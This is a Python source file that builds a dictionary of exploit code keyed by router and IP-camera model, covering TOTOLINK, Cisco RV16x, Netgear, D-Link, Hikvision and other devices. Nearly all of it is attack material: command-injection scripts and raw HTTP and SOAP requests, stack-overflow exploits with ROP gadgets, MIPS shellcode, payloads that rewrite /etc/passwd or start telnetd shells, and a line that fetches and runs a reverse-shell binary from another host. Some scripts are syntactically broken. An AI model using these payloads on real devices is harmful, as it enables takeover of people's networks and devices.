from multidict import CIMultiDict

model_exp_dic = CIMultiDict()

model_exp_dic["TOTOLINK_A7000R"] = {
'lang_cmd_inject':
'''
#Firmware V4.1cu.4080 test success
#author: doudoudedi
import sys
import requests
import json
try:
    ip = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3] 
except:
    print("please use python exp.py [ip] [port] [command]")
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)

command='ls -al'

headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
}
data={
    "topicurl":"setting/setLanguageCfg",
    "langType":"cn;{};".format(cmd),
    "langFlag":"0"

print(requests.post(url,headers=headers,data=json.dumps(data)).text)
''', "stack_overflow":
"""
#from b0ldfrev poc
#affect V4.1cu.4154
import requests
import urllib3
import sys
from struct import pack

if len(sys.argv)!=4:
	print "Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command"
	exit(0)

url = sys.argv[1]
base =  int(sys.argv[2],16)
cmd= sys.argv[3]


if url[-1:]=='/':
   url=url[:-1]

offset=0x158
offset_s3=0x150
base=0x77c4f000   ###  modify

system=base+0x598f0 
gadget=base+0x00040224 #addiu $a0, $sp, 0x28; addiu $a1, $zero, 1; move $t9, $s3; jalr $t9; move $a2, $s5; 

#cmd="echo root:\$1\$\$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh > /etc/passwd && telnetd"

#cmd="wget http://192.168.122.11:3333/reverse -O /msf && chmod 777 /msf && /msf"


padding = "1"*offset_s3+pack('<I',system)

payload ="SESSION_ID="+padding.ljust(offset,"2")
payload += pack('<I',gadget)
payload += "3"*0x28
payload += cmd+"&"

urllib3.disable_warnings()

url= url+"/12345678.asp"
head= {'Cookie':payload}

r=requests.get(url,headers=head,verify=False)

print(r)
print(r.text)
print(r.content)

        """,
    "stack_ovefflow2":
"""
#from b0ldfrev poc
#affect V9.1.0u.6115
import requests
import urllib3
import sys
from struct import pack


if len(sys.argv)!=4:
    print "Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command"
    exit(0)

url = sys.argv[1]
base =  int(sys.argv[2],16)
cmd= sys.argv[3]


if url[-1:]=='/':
   url=url[:-1]

offset=0x160
offset_s4=0x14c+8

system=base+0x5F8F0

gadget=base+0x54aa0  #addiu $s1, $sp, 0x18; move $a0, $s1; addiu $a1, $zero, 0x100; move $t9, $s4; jalr $t9; move $a2, $s0; 

cmd="echo root:\$1\$\$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh > /etc/passwd && telnetd"
#cmd="wget http://192.168.122.11:3333/reverse -O /msf && chmod 777 /msf && /msf"

padding = "1"*offset_s4+pack('<I',system)

payload = "SESSION_ID="+padding.ljust(offset,"2")
payload += pack('<I',gadget)
payload += "3"*0x18
payload += cmd+"&"

urllib3.disable_warnings()

url= url+"/12345678.asp"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
print(r)
print(r.text)
print(r.content)
"""
}

model_exp_dic["Cisco_RV16x"] = {
    "CVE-2021-1289":
"""
# from b0ldfrev
# affect firmware version <1.0.01.02
import requests
import sys
import base64
import urllib3

if len(sys.argv)!=3:
   print "Parameter error. python exp.py url \\"command\\""
   exit(0)

url = sys.argv[1]
cmd =  sys.argv[2]

CMD=";"+cmd+";"
CMD=base64.b64encode(CMD)

header = {'Authorization':"Basic "+CMD}

urllib3.disable_warnings()

if url[-1:]=='/':
  url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)

print "DONE!"
""",
    "CVE-2021-1602":
"""
import requests
import sys
import base64
import urllib3

if len(sys.argv)!=3:
   print "Parameter error. python exp.py url \\"command with no parameters\\""
   exit(0)

url = sys.argv[1]
cmd =  sys.argv[2]

CMD="\\n"+cmd+"\\n"
CMD=base64.b64encode(CMD)

header = {'Authorization':"Basic "+CMD}

urllib3.disable_warnings()

if url[-1:]=='/':
  url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)

print "DONE!"
"""}

model_exp_dic["TOTOLINK_N600R"] = {
    "CVE-2022-26186": '''
#affect V4.3.0cu.7570
POST /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;touch${IFS}1.txt;&filetype=gz HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

aaaa
        ''',
    "CVE-2022-26187":
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
command='ls -al'
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
}
data={
    "topicurl":"setting/setDiagnosisCfg",
    "actionFlag":"1",
    "ipDoamin":"www.baidu.com\\n{}\\n".format(command)
}
print requests.post(url,headers=headers,data=json.dumps(data)).text
		""",
    "CVE-2022-26188":
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
    command=sys.argv[3]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s",
}
data={
    "topicurl":"setting/NTPSyncWithHost",
    "hostTime":"2021-11-11 10:34:09\\\"\\n{}\\n\\\"".format(command)
}
requests.post(url,headers=headers,data=json.dumps(data))
""",
"CVE-2022-26189":
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
    command=sys.argv[3]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
		}
data={
    "topicurl":"setting/setLanguageCfg",
    "langType":"cn;{};".format(command)
}
requests.post(url,headers=headers,data=json.dumps(data))
"""
}
model_exp_dic["TOTOLINK_EX200"] = {
    'CVE-2021-43711':
"""
GET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1

Host: 192.168.0.254

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
"""
}

model_exp_dic["Netgear_EX6100v1"] = {
    "CVE-2022-24655":
"""
#Aouth:doudoudedi
#please pip install pwn
from pwn import *
import sys
import os
choice=0
request=''
try:
    target_ip=sys.argv[1]
    target_version=sys.argv[2]
except:
    print("python ./exp.py ipaddress id")
    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")
    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")
    exit(0)

def generate_payload():
    global target_version,request,choice
    if target_version=="1": 
            system_addr=0x00422848
            change_password=0x042C550
    if target_version=="2":
            system_addr=0x422828
            change_password=0x042C530
    aim=0
    print("1.open telnetd 25\\n2.change http password (NULL)")
    choice=int(input())
    if(choice==1):
    aim=system_addr
    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
    request += b"NT: upnp:event\\n"
    request += b"Timeout: Second-1800\\n"
    request += b"Accept-Encoding: gzip, deflate\\n"
    request += request+b"doud"
    request += request
    request = request.ljust(0x1f00,b"a")
    request += p32(0x7fff7030)
    request = request.ljust(0x1f48-0x14,b"a")
    request += p32(aim)
    if(choice==2):
    aim=change_password
    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
    request += b"NT: upnp:event\\n"
    request += b"Timeout: Second-1800\\n"
    request += b"Accept-Encoding: gzip, deflate\\n"
    request += request+b"doud"
    request += request
    request = request.ljust(0x1f00,b"a")
    request += p32(0x7fff7030)
    request += p32(0x7fff7030)*12
    request += p32(0x42C550)
    request += p32(aim)


def attack():
    p=remote(target_ip,5000)
    p.send(request)
    if(choice==1):
    os.system("telnet %s 25"%(target_ip))
    #p.interactive()
#request += p32(0x422944)
#request += "a"*0x500
#request += p32(0x7fff7030)*8
if __name__=="__main__":
    generate_payload()
    attack()
"""
}

model_exp_dic["TOTOLINK_A800R"] = {
    "A800R_Command_inject": "curl -v 'http://192.168.2.10/cgi-bin/downloadFlile.cgi?;command;'"
}

model_exp_dic["wavlink_WL-WN535K3"] = {
    "WN535K3_Command_injection":
"""
http://192.168.2.10/cgi-bin/mesh.cgi?page=extender&key=';command;'
"""
}

model_exp_dic["TOTOLINK_A810R"] = {
    "downloadFile_cmd_inject":
"""
#from https://github.com/Erebua/CVE
GET /cgi-bin/downloadFlile.cgi?payload=`dw>../2.txt` HTTP/1.1
Host: 192.168.163.165
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
"""
}

model_exp_dic["BR-6428nS_v3"] = {
    "Command_injection_auth":
"""
#from https://github.com/Erebua/CVE
POST /goform/formWlanMP HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://192.168.2.1
Authorization: Basic YWRtaW46MTIzNA==
Connection: close
Referer: http://192.168.2.1/status.asp
Cookie: language=14
Upgrade-Insecure-Requests: 1

ateFunc=1;touch%20/tmp/Swe3ty&submit-url=%2Findex.asp
"""
}

model_exp_dic["DS-2CD2xx0F-ISeries"] = {
    "CVE-2017-7921":
"""
http://IP:PORT/Security/users?auth=YWRtaW46MTEK  #get al userinfo
http://IP:PORT/onvif-http/snapshot?auth=YWRtaW46MTEK #get camera video
http://IP:PORT/System/configurationFile?auth=YWRtaW46MTEK # get passwd file
"""
}

model_exp_dic["TOTOLINK_X5000R"] = {
    "downloadFile_cmd_inject":
"""
#from https://github.com/Erebua/CVE
GET /cgi-bin/downloadFlile.cgi?payload=`dw>../2.txt` HTTP/1.1
Host: 192.168.163.165
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
"""
}

model_exp_dic["DIR-816"] = {
    "CVE-2021-39510":
"""
curl -s http://192.168.33.9/dir_login.asp  | grep tokenid
curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin';shutdown;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
""",
"CVE-2021-39509":
"""
curl -s http://192.168.33.9/dir_login.asp  | grep tokenid
curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=IjtyZWJvb3Q7Ig==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id
""",
"stackover_flow_host":
"""
# Tested product: DIR-816 (CN)
# Hardware version: A2
# Firmware version: v1.10B05 (2018/01/04)
# Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
#
import socket
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
p.connect(("192.168.0.1" , 80))
shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***
rn = "\\r\\n"
strptr = "\\x60\\x70\\xff\\x7f"
padding = "\\x00\\x00\\x00\\x00"
payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\\xb8\\xfe\\x48" + rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += rn
p.send(payload)
print p.recv(4096)
""",
    "CVE-2017-17562":
"""
#include #include unsigned char sc[] = {"\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04" "\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20" "\\x80\\x01\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27" "\\x20\\x80\\x01\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24" "\\x0c\\x09\\x09\\x01\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09" "\\x01\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x15\\xb3\\x05\\x3c\\x02\\x00" "\\xa5\\x34\\xf8\\xff\\xa5\\xaf\\x10\\x67\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc" "\\xff\\xa5\\xaf\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01" "\\x4a\\x10\\x02\\x24\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08" "\\x35\\xec\\xff\\xa8\\xaf\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff" "\\xa8\\xaf\\xff\\xff\\x07\\x28\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec" "\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23" "\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09" "\\x01" }; static void before_main(void) __attribute__((constructor)); static void before_main(void) { void(*s)(void); s = sc; s(); } 
curl -X POST -b "user=admin;platform=0" --data-binary @payloads/mipsel-hw.so http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i
"""
}

model_exp_dic["DIR-810L"] = {
    "CVE-2021-45382":
"""
POST /ddns_check.ccp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 186
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/storage.asp
Cookie: hasLogin=1

ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsPassword=123123123
"""
}

model_exp_dic["DIR-605"] = {

}

model_exp_dic["DIR-860L"] = {
    "CVE-2018-20114":
"""
#unauthenticated remote code execution 
#affect version DIR-818LW_REVA - 2.05。B03，DIR-860L_REVB - 2.03。B03
# nc 192.168.0.1 49152
POST /soap.cgi?service=&&iptables -P INPUT ACCEPT&&iptables -P FORWARD ACCEPT&&iptables -P OUTPUT ACCEPT&&iptables -t nat -P PREROUTING ACCEPT&&iptables -t nat -P OUTPUT ACCEPT&&iptables -t nat -P POSTROUTING ACCEPT&&telnetd -p 9999&& HTTP/1.1
Host: 192.168.0.1:49152
Accept-Encoding: identity
Content-Length: 16
SOAPAction: "whatever-serviceType#whatever-action"
Content-Type: text/xml

# telnet 192.168.0.1 9999
"""
}

model_exp_dic["TEW-651BR"] = {
    "CVE-2019-11399":
"""
POST /get_set.ccp HTTP/1.1

ccp_act=set&
ccpSubEvent=CCP_SUB_LAN&
nextPage=lan.htm&
old_ip=192.168.10.1&
old_mask=255.255.255.0&
new_ip=192.168.10.1&
new_mask=255.255.255.0&
igd_DeviceMode_1.0.0.0.0=0&
lanHostCfg_HostName_1.1.1.0.0=`cmd`&
lanHostCfg_IPAddress_1.1.1.0.0=192.168.10.1&
lanHostCfg_SubnetMask_1.1.1.0.0=255.255.255.0&
lanHostCfg_DHCPServerEnable_1.1.1.0.0=1&
lanHostCfg_MinAddress_1.1.1.0.0=192.168.10.101&
lanHostCfg_MaxAddress_1.1.1.0.0=192.168.10.199&
lanHostCfg_DomainName_1.1.1.0.0=&
lanHostCfg_DHCPLeaseTime_1.1.1.0.0=10080&
lanHostCfg_StaticDHCPEnable_1.1.1.0.0=1
""",
    "CVE-2018-19987":
"""
#PoC xml
#affetc DIR-860L_REVB - 2.03
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetAccessPointMode xmlns="http://purenetworks.com/HNAP1/">
<IsAccessPoint>`telnetd`</IsAccessPoint> </SetAccessPointMode>
</soap:Body> </soap:Envelope>
"""
}

model_exp_dic["DIR-818LW"] = {
    "CVE-2018-19986":
"""
#POC XML data
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetRouterSettings xmlns="http://purenetworks.com/HNAP1/">
<ManageRemote>default</ManageRemote>
<ManageWireless>default</ManageWireless>
<RemoteSSL>default</RemoteSSL>
<RemotePort>`telnetd`</RemotePort>
<DomainName>default</DomainName>
<WiredQoS>default</WiredQoS>
</SetRouterSettings>
</soap:Body> </soap:Envelope>
"""
}

model_exp_dic["DIR-846"] = {
    "CVE-2021-46315":
"""
#affect A1version
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
HNAP_AUTH: AB26D09C30FC07AF9FA05EF59B3B2558 1640421298429
Content-Length: 284
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Diagnosis.html?t=1640421281425
Cookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=2

{"SetMasterWLanSettings":{"wl(0).(0)_enable":"1","wl(0).(0)_ssid":"`reboot`","wl(0).(0)_preshared_key":"aXJrZXJPZ2dNVEl6TkRVMk56Zz0=","wl(0).(0)_crypto":"aestkip","wl(1).(0)_enable":"1","wl(1).(0)_ssid":"\\nreboot\\n","wl(1).(0)_preshared_key":"aXJrZXJPZ2c=","wl(1).(0)_crypto":"none"}}
""",
    "CVE-2021-46315":
"""
#affect A1version
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
HNAP_AUTH: AB26D09C30FC07AF9FA05EF59B3B2558 1640421298429
Content-Length: 76
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Diagnosis.html?t=1640421281425
Cookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=2

{"SetWizardConfig":{"wl(1).(0)_ssid":"`reboot`","wl(0).(0)_ssid":"aa\\nreboot\\n"}}
        """,
    "CVE-2021-46314":
"""
#affect A1version
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
HNAP_AUTH: B573700726C0DE33335368EFA98967D4 1640426452615
Content-Length: 199
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Diagnosis.html?t=1640426411756
Cookie: uid=yo1BBSdJ; PrivateKey=F307B0A38DD86259C01188B535369C5A; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=4

{"SetNetworkTomographySettings":{"tomography_ping_address":"www.baidu.com/'`reboot`'","tomography_ping_number":"22","tomography_ping_size":"40","tomography_ping_timeout":"","tomography_ping_ttl":""}}
        """
}

model_exp_dic["DIR-822"] = {
    "CVE-2018-19986":
"""
#POC XML data
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetRouterSettings xmlns="http://purenetworks.com/HNAP1/">
<ManageRemote>default</ManageRemote>
<ManageWireless>default</ManageWireless>
<RemoteSSL>default</RemoteSSL>
<RemotePort>`telnetd`</RemotePort>
<DomainName>default</DomainName>
<WiredQoS>default</WiredQoS>
</SetRouterSettings>
</soap:Body> </soap:Envelope>
""",
"CVE-2018-19987":
"""
#POC XML
#affect Firmware version: DIR-822_REVB - 202KRb06, DIR-822_REVC - 3.10B06, DIR-860L_REVB - 2.03.B03, DIR-868L_REVB - 2.05B02, DIR-880L_REVA - 1.20B01_01_i3se_BETA, DIR-890L_REVA - 1.21B02_BETA
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetAccessPointMode xmlns="http://purenetworks.com/HNAP1/">
<IsAccessPoint>`telnetd`</IsAccessPoint> </SetAccessPointMode>
</soap:Body> </soap:Envelope>
""",
"CVE-2018-19989":
"""
#POC XML
#affect Firmware version: DIR-822_REVB - 202KRb06, DIR-822_REVC - 3.10B06
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetQoSSettings> <uplink>`telnetd`</uplink>
<downlink>default</downlink>
<QoSInfoData> <QoSInfo>
<Hostname>hostname</Hostname>
<IPAddress>192.168.0.1</IPAddress>
<MACAddress>default</MACAddress>
<Priority>default</Priority>
<Type>default</Type>
</QoSInfo> </QoSInfoData> </SetQoSSettings>
</soap:Body> </soap:Envelope>
""",
"CVE-2018-19990":
"""
#POC XML
#Firmware version: DIR822B1 - 202KRb06
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetWiFiVerifyAlpha xmlns="http://purenetworks.com/HNAP1/" > <WPS>
<DEV_PIN>default</DEV_PIN>
<ResetToUnconfigured>default</ResetToUnconfigured>
<WPSPBC>default</WPSPBC>
<WPSPIN>`telnetd`</WPSPIN> </WPS>
</SetWiFiVerifyAlpha>
</soap:Body> </soap:Envelope>
"""
}

model_exp_dic["DIR-868L"] = {
    "CVE-2018-19988":
"""
#POC XML
#affect Firmware version: DIR-868L_REVB - 2.05B02
<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<SetClientInfoDemo> <ClientInfoLists> <ClientInfo>
<MacAddress>11:22:33:44:55:66</MacAddress>
<NickName>default</NickName>
<ReserveIP>192.168.0.1</ReserveIP> <SupportedAction>
<AudioMute>'`telnetd`'</AudioMute>
<AudioEnable>default</AudioEnable>
<SmartPlugEnable>default</SmartPlugEnable>
<ZWaveSmartPlug>default</ZWaveSmartPlug> </SupportedAction>
</ClientInfo> </ClientInfoLists>
</SetClientInfoDemo>
</soap:Body> </soap:Envelope>
"""
}

model_exp_dic["DCS-93xL"] = {
    "CVE-2019-10999":
"""
#!/usr/bin/python3

import sys
import argparse
import requests
import importlib

from DlinkExploit import version
from DlinkExploit import util


def exploit_target(target_ip, target_port, command, username, password):
    '''
    Perform target exploitation.
    :param target_ip: IP address of the target.
    :type target_ip: str
    :param target_port: Listening port of alphapd.
    :type target_port: str
    :param command: Command to execute on the target after exploitation is
                    complete.
    :type command: str
    :param username: Username for HTTP authentication.
    :type username: str
    :param password: Password for HTTP authentication.
    :type password: str
    '''
    if username is None or password is None:
        print('Username and password are required for exploitation.')
        sys.exit(-1)

    # Must have a value in the referer field of the HTTP header or a request
    # Forbidden is returned. Doesn't seem to like if port 80 is in the referer
    # field so handle it differently here.
    if target_port == '80':
        url = 'http://%s/wireless.htm' % target_ip
        referer = 'http://%s/wizard.htm' % target_ip
    else:
        url = 'http://%s:%s/wireless.htm' % (target_ip, target_port)
        referer = 'http://%s:%s/wizard.htm' % (target_ip, target_port)

    try:
        camera_version = version.get_camera_version(target_ip, target_port)
    except:
        sys.exit(-1)

    print('%s' % camera_version)

    # This might get tedious if the models aren't consistent, but its pretty
    # simple for now.
    try:
        target_camera = 'DlinkExploit.overflows.%s' % camera_version.model
        camera_overflow = importlib.import_module(target_camera)
    except ModuleNotFoundError:
        print('Target model, (%s), not found.' % camera_version.model)
        sys.exit(-1)

    camera_overflow = camera_overflow.Overflow()
    url = url + camera_overflow.generate(camera_version, command)

    print('URL: %s' % url)

    auth = util.create_http_auth(target_ip, target_port, username, password)
    if auth is None:
        print('Invalid authentication type. Neither basic or digest are '
              'supported.')
        sys.exit(-1)

    try:
        r = requests.get(url, auth=auth, headers={'Referer': referer})
        print('Status: %s' % r.status_code)
    except:
        pass


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('-i', '--ip', help='Target IP address.')
    parser.add_argument('-P', '--port', help='Target Port.', default='80')
    parser.add_argument('-c', '--command', default='telnetd -p 5555 -l /bin/sh',
                        help='Command to execute after exploitation.')
